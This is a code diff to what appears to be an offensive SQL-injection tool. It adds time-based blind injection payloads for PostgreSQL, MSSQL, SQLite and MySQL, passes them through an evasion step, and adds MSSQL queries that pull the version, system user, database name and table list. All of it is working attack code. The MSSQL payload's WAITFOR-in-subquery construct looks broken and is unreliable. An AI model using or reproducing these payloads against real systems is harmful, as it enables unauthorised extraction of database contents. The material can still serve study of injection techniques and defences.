@@ -163,9 +163,33 @@ def _binary_search_char(
         false_pl = apply_evasion(false_payload, evasion)
 
         if mode == "time":
-            # Time-blind: if condition is true, the delay fires
+            # Time-blind: if condition is true, the delay fires.
+            # Use per-DBMS conditional sleep syntax.
             delay = opts.time_threshold
-            time_true_pl = f"' AND IF({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid},SLEEP({delay}),0)-- -"
+            _dbms = (opts.dbms or "auto").lower()
+            if _dbms in ("postgres", "postgresql"):
+                # PostgreSQL: CASE WHEN cond THEN pg_sleep(n) END
+                time_true_pl = (
+                    f"' AND (CASE WHEN ({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid})"
+                    f" THEN (SELECT 1 FROM pg_sleep({delay})) ELSE 1 END)=1-- -"
+                )
+            elif _dbms == "mssql":
+                # MSSQL: IF(cond) WAITFOR DELAY — must be a stacked statement
+                # Use a conditional WAITFOR via a subquery trick that works in-band
+                time_true_pl = (
+                    f"' AND 1=(SELECT CASE WHEN ({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid})"
+                    f" THEN (SELECT 1 FROM (SELECT WAITFOR DELAY '0:0:{delay}') x) ELSE 1 END)-- -"
+                )
+            elif _dbms == "sqlite":
+                # SQLite: randomblob-based busy loop to induce delay when condition is true
+                time_true_pl = (
+                    f"' AND (CASE WHEN ({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid})"
+                    f" THEN (SELECT COUNT(*) FROM (WITH RECURSIVE r(x) AS"
+                    f" (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<1000000) SELECT x FROM r)) ELSE 1 END)=1-- -"
+                )
+            else:
+                # MySQL / MariaDB / auto: IF(cond, SLEEP(n), 0)
+                time_true_pl = f"' AND IF({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid},SLEEP({delay}),0)-- -"
             time_true_pl = apply_evasion(time_true_pl, evasion)
             elapsed = _timed_fetch(
                 injector, url, method, params, param, time_true_pl,
@@ -242,6 +266,15 @@ def get_extraction_targets(dbms: str) -> List[tuple[str, str]]:
              "(SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') "
              "FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1)"),
         ]
+    elif dbms == "mssql":
+        return [
+            ("version",          "CAST(@@version AS VARCHAR(512))"),
+            ("current_user",     "SYSTEM_USER"),
+            ("current_database", "DB_NAME()"),
+            ("tables",
+             "(SELECT STRING_AGG(table_name,',') FROM information_schema.tables "
+             "WHERE table_type='BASE TABLE')"),
+        ]
     elif dbms == "postgresql":
         return [
             ("version",          "VERSION()"),
@@ -266,8 +299,8 @@ def get_extraction_targets(dbms: str) -> List[tuple[str, str]]:
              "FROM user_tables)"),
         ]
     else:
-        # Generic fallback — VERSION() works on MySQL, PG, MariaDB
+        # Generic fallback — VERSION() works on MySQL, PostgreSQL, MariaDB
         return [
             ("version",      "VERSION()"),
-            ("current_user", "CURRENT_USER()"),
+            ("current_user", "CURRENT_USER"),
         ]
